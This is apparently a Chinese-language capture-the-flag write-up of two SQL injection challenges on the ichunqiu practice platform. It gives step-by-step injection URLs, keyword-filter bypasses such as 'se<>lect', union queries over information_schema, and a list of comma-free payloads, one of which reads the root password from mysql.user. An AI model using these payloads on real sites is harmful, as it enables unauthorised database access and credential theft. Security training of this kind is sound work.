最近做了i春秋上的两道sql注入题，很有特色，学到了不少东西。。。。

SQL

第一步：判断是否存在注入
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1'#
错误。。说明存在注入。。
第二步：判断为数字注入还是字符注入
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 and 1=1
显示页面错误，不知道什么什么情况，怀疑是否and被过滤了，试了an/**/d，结果，无显示。。
换成1=2也是如此。。。。。
再试试是否为字符型：
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id='1' and ‘1’=’1
这个显示 inj code!
说明应该是数字型啊！！
后来看了别人的wp，才发现原来可以这种an<>d防过滤的方法。。
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 an<>d 1=1 正确。
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 an<>d 1=2 无显示
说明为数字型
第三步：判断数目
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 order by 3#
错误。。。
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 ord<>er by 3#
正确。注意：or<>der 错误，因为or也是被过滤的，好坑。。。。
http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 union se<>lect 1,2,3#
显示2，在二处注入
第四步：开始爆出数据库，表，列，数据
1.http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 union se<>lect 1,database(),3
2.http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 union se<>lect 1,table_name,3 from information_schema.tables where table_schema=’sqli’#
3.http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 union se<>lect 1,columu_name,3 from information_schema.columns where table_schema=’sqli’ an<>d table_name=’info’#
4.http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1 union se<>lect 1,flAg_T5ZNdrm,3 from info#
最后出结果。。。

sqli

这个题有坑，很大的坑，看了别人的wp才知道。。。。
可是我看了知道有重定向，重定向。。。找不到。。
后来才知道在访问这个网址时出现的。
http://5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d.changame.ichunqiu.com

这里有一个技巧：重定向一般发生在访问域名而且不加参数或者文件夹名，文件名这样的情况下，比如直接访问 http://5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d.changame.ichunqiu.com 就会重定向到一个默认的页面文件。因该记住这个套路。

结果：

这个结果，好意外。。。
然后开始注入，注入也有毒。。。
先尝试：
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1'
返回1’,说明id存在注入
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1 and 1 页面正常
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1 and 0 页面正常
有点问题啊，再试试字符注入呢
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1' and ‘1 页面正常
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1' and ‘0 页面错误
说明是字符注入
可以从题目中看出order by 2
验证一下，也可以看看是否有什么过滤
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1' order by 2#
发现#被过滤掉了，用url码换一下
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1' order by 2%23 正常
接下来判断在哪个位置注入：
http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1' union select 1,2%23
逗号本身及其后边全被过滤掉了
这次url也不管事了。。。
下面有几种大佬总结不用逗号的过滤方法：
1.select from table1 where id =1 and exists (select from table2 where ord(substring(username from 1 for 1)=97);

2.127’ UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#

3.select case when substring((select password from mysql.user where user=’root’) from 1 for 1)=’e’ then sleep(5) else 0 end #

4.substring((select password from mysql.user where user=’root’) from -1）=’e’

选第二种看一看：
http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1' union select * from (select 1) a join (select database() ) b %23

http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1' union select * from (select 1) a join (select group_concat(table_name) from information_schema.tables where table_schema=’sqli’ ) b %23

http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1' union select * from (select 1) a join (select group_concat(column_name) from information_schema.columns where table_name=’users’ ) b %23

http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1' union select * from (select 1) a join (select flag_9c861b688330 from users ) b %23
